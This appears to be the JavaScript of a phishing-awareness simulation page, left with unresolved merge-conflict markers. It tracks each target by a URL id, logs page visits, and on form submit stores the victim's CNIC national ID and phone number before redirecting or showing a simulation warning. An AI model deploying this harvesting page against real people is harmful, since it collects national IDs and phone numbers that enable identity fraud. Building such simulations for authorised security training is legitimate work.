// Get userId from URL
const params = new URLSearchParams(window.location.search);
const userId = params.get("id") || "unknown";

<<<<<<< HEAD
// Page load log
=======
// 🔹 Page load = CLICK TRACK
>>>>>>> db5c2c21997d582c0561918b276fe63043cf7f64
window.addEventListener("load", function () {
    db.collection("logs").add({
        userId: userId,
        action: "clicked",
        time: new Date()
    })
    .then(() => console.log("Click logged"))
    .catch(err => console.error(err));
});

<<<<<<< HEAD
// Form submit
=======
// 🔹 Form submit
>>>>>>> db5c2c21997d582c0561918b276fe63043cf7f64
document.getElementById("loginForm").addEventListener("submit", function(e) {
    e.preventDefault();

    const CNICValue = document.getElementById("userCNIC").value;
    const phoneValue = document.getElementById("userPhone").value;

    db.collection("logs").add({
        userId: userId,
        CNIC: CNICValue,
        PhoneNo: phoneValue,
        action: "submitted",
        time: new Date()
    })
    .then(() => console.log("Submit logged"))
    .catch(err => console.error(err));

<<<<<<< HEAD
    // 🔥 Redirect to warning page instead of alert
    window.location.href = "hacked.html";
=======
    alert("⚠️ This was a phishing awareness simulation!\n\nAlways verify links before entering sensitive data.");

    window.location.href = "https://your-company-awareness-page.com";
>>>>>>> db5c2c21997d582c0561918b276fe63043cf7f64
});